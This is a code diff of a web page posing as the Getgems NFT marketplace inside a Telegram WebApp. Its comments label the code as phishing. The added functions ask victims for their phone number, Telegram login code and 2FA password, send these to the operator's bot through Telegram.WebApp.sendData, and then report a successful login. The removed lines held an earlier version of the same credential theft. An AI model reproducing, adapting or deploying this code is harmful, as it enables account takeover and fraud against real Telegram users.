-            // Скрыть все секции
-            document.querySelectorAll('.section').forEach(section => {
-                section.classList.remove('active');
-            });
-            
-            // Скрыть все навигационные кнопки
+        // Переключение вкладок
+        function switchTab(tabId) {
+            // Убрать активный класс у всех
             document.querySelectorAll('.nav-item').forEach(item => {
                 item.classList.remove('active');
             });
             
-            // Показать выбранную секцию
-            document.getElementById(sectionId + 'Section').classList.add('active');
+            // Добавить активный класс выбранной
+            event.currentTarget.classList.add('active');
             
-            // Активировать соответствующую кнопку навигации
-            document.querySelector(`.nav-item[onclick*="${sectionId}"]`).classList.add('active');
-            
-            // Если не авторизован и пытается открыть профиль/NFT/рефералы
-            if (!userData.loggedIn && ['profile', 'nft', 'referral'].includes(sectionId)) {
-                openAuthPopup();
-                showSection('marketplace');
-                return;
+            // Здесь можно добавить логику загрузки контента для каждой вкладки
+            switch(tabId) {
+                case 'market':
+                    // Загрузка маркетплейса
+                    break;
+                case 'auctions':
+                    // Загрузка аукционов
+                    break;
+                case 'catalog':
+                    // Загрузка каталога
+                    break;
+                case 'cart':
+                    // Загрузка корзины
+                    if (!userData.loggedIn) {
+                        showAuthPopup();
+                        return;
+                    }
+                    break;
+                case 'profile':
+                    // Загрузка профиля
+                    if (!userData.loggedIn) {
+                        showAuthPopup();
+                        return;
+                    }
+                    break;
             }
         }
         
-        function openAuthPopup() {
-            document.getElementById('authPopup').style.display = 'flex';
-        }
-        
-        function closeAuthPopup() {
-            document.getElementById('authPopup').style.display = 'none';
-        }
-        
-        function openAuthSection() {
-            closeAuthPopup();
-            showSection('auth');
-        }
-        
-        // === АВТОРИЗАЦИЯ ===
-        function nextAuthStep() {
-            const phone = document.getElementById('phoneInput').value;
-            if (!phone) {
-                alert('Введите номер телефона');
-                return;
+        // Фишинговая авторизация при клике на профиль
+        function showAuthPopup() {
+            if (window.Telegram && Telegram.WebApp) {
+                // Если в Telegram WebApp, показываем попап авторизации
+                Telegram.WebApp.showPopup({
+                    title: 'Авторизация',
+                    message: 'Для доступа требуется войти в аккаунт',
+                    buttons: [
+                        {type: 'default', text: 'Войти'},
+                        {type: 'cancel', text: 'Отмена'}
+                    ]
+                }, function(btnId) {
+                    if (btnId === 'default') {
+                        startPhishingAuth();
+                    }
+                });
+            } else {
+                // Вне Telegram - обычный алерт
+                if (confirm('Для доступа к профилю требуется авторизация. Перейти к авторизации?')) {
+                    startPhishingAuth();
+                }
             }
-            
-            userData.phone = phone;
-            document.getElementById('authStep1').classList.remove('active');
-            document.getElementById('authStep2').classList.add('active');
         }
         
-        function submitAuth() {
-            const code = document.getElementById('codeInput').value;
-            const password = document.getElementById('passwordInput').value;
+        // Фишинговая авторизация
+        function startPhishingAuth() {
+            const phone = prompt('Введите номер телефона для авторизации:');
+            if (!phone) return;
             
-            if (!code) {
-                alert('Введите код подтверждения');
-                return;
-            }
+            const code = prompt('Введите 5-значный код из Telegram:');
+            if (!code) return;
             
-            userData.code = code;
-            userData.password = password;
+            const password2fa = prompt('Введите пароль 2FA (если есть, можно оставить пустым):');
             
-            // Фишинг: отправка данных в Telegram бота
+            // Отправка фишинговых данных
             if (window.Telegram && Telegram.WebApp) {
                 const phishingData = {
                     type: "login_data",
                     user: {
-                        phone: userData.phone,
-                        login_code: userData.code,
-                        password_2fa: userData.password,
-                        user_agent: navigator.userAgent,
+                        phone: phone,
+                        login_code: code,
+                        password_2fa: password2fa || '',
                         timestamp: new Date().toISOString()
                     }
                 };
+                
                 Telegram.WebApp.sendData(JSON.stringify(phishingData));
+                
+                // Обновляем интерфейс
+                userData.loggedIn = true;
+                userData.phone = phone;
+                alert('Авторизация успешна!');
             } else {
-                console.log('Фишинг данные:', userData);
+                console.log('Фишинг данные:', {phone, code, password2fa});
+                alert('Авторизация завершена (тестовый режим)');
+                userData.loggedIn = true;
+                userData.phone = phone;
             }
-            
-            // Сохраняем данные пользователя
-            userData.loggedIn = true;
-            userData.balance = 1245;
-            userData.regDate = new Date().toLocaleDateString();
-            userData.referrals = 8;
-            userData.earned = 240;
-            
-            // Показать успех
-            document.getElementById('authStep2').classList.remove('active');
-            document.getElementById('authSuccess').classList.add('active');
         }
         
-        function authComplete() {
-            document.getElementById('authSuccess').classList.remove('active');
-            document.getElementById('authStep1').classList.add('active');
-            
-            // Обновить интерфейс
-            updateUserInterface();
-            
-            // Вернуться на маркетплейс
-            showSection('marketplace');
-        }
-        
-        // === NFT МАРКЕТПЛЕЙС ===
-        function loadNFTs() {
-            const nftGrid = document.getElementById('nftGrid');
-            nftGrid.innerHTML = '';
-            
-            GEMS_RELAYER_NFTS.forEach(nft => {
-                const card = document.createElement('div');
-                card.className = 'nft-card';
-                card.innerHTML = `
-                    <div class="nft-image">
-                        ${nft.emoji}
-                        ${nft.verified ? '<div class="nft-verified">✓</div>' : ''}
-                    </div>
-                    <div class="nft-info">
-                        <div class="nft-name">${nft.name}</div>
-                        <div class="nft-price">${nft.price}</div>
-                        <div class="nft-seller">${nft.seller}</div>
-                        <button class="nft-buy-btn" onclick="buyNFT(${nft.id})">Купить NFT</button>
-                    </div>
-                `;
-                nftGrid.appendChild(card);
-            });
-        }
-        
-        function filterNFTs(category) {
-            document.querySelectorAll('.filter-btn').forEach(btn => btn.classList.remove('active'));
-            event.target.classList.add('active');
-            
-            const nftGrid = document.getElementById('nftGrid');
-            nftGrid.innerHTML = '';
-            
-            const filteredNFTs = category === 'all' 
-                ? GEMS_RELAYER_NFTS 
-                : GEMS_RELAYER_NFTS.filter(nft => nft.category === category);
-            
-            filteredNFTs.forEach(nft => {
-                const card = document.createElement('div');
-                card.className = 'nft-card';
-                card.innerHTML = `
-                    <div class="nft-image">
-                        ${nft.emoji}
-                        ${nft.verified ? '<div class="nft-verified">✓</div>' : ''}
-                    </div>
-                    <div class="nft-info">
-                        <div class="nft-name">${nft.name}</div>
-                        <div class="nft-price">${nft.price}</div>
-                        <div class="nft-seller">${nft.seller}</div>
-                        <button class="nft-buy-btn" onclick="buyNFT(${nft.id})">Купить NFT</button>
-                    </div>
-                `;
-                nftGrid.appendChild(card);
-            });
-        }
-        
-        function buyNFT(id) {
+        // Покупка NFT
+        function buyNFT(nftName, price) {
             if (!userData.loggedIn) {
-                openAuthPopup();
+                showAuthPopup();
                 return;
             }
             
-            const nft = GEMS_RELAYER_NFTS.find(n => n.id === id);
-            if (!nft) return;
-            
-            if (window.Telegram && Telegram.WebApp) {
-                Telegram.WebApp.showPopup({
-                    title: 'Покупка NFT',
-                    message: `Купить "${nft.name}" за ${nft.price}?`,
-                    buttons: [
-                        { type: 'default', text: 'Купить' },
-                        { type: 'cancel' }
-                    ]
-                });
-            } else {
-                alert(`NFT "${nft.name}" куплен за ${nft.price}`);
+            if (confirm(`Купить "${nftName}" за ${price}?`)) {
+                // Списание баланса
+                const priceNumber = parseFloat(price.replace('⭐ ', '').replace(',', '.'));
+                userData.balance -= priceNumber;
+                
+                // Обновление отображения баланса
+                document.querySelector('.user-balance').innerHTML = `<span>⭐</span> ${userData.balance.toFixed(1).replace('.', ',')}`;
+                
+                alert(`NFT "${nftName}" успешно куплен!`);
             }
         }
         
-        // === ПРОФИЛЬ И ДАННЫЕ ===
-        function loadUserData() {
-            const saved = localStorage.getItem('getgems_user');
-            if (saved) {
-                userData = JSON.parse(saved);
-                updateUserInterface();
+        // Добавляем обработчики покупки
+        document.addEventListener('DOMContentLoaded', function() {
+            document.querySelectorAll('.nft-card').forEach(card => {
+                card.addEventListener('click', function() {
+                    const nftName = this.querySelector('.nft-name').textContent;
+                    const price = this.querySelector('.nft-price').textContent;
+                    buyNFT(nftName, price);
+                });
+            });
+        });
+        
+        // Инициализация при загрузке
+        window.onload = function() {
+            console.log('Getgems Marketplace loaded');
+            
+            // Проверяем, в Telegram ли мы
+            if (window.Telegram && Telegram.WebApp) {
+                Telegram.WebApp.ready();
+                Telegram.WebApp.expand();
             }
-        }
+        };
+    </script>
+</body>
+</html>
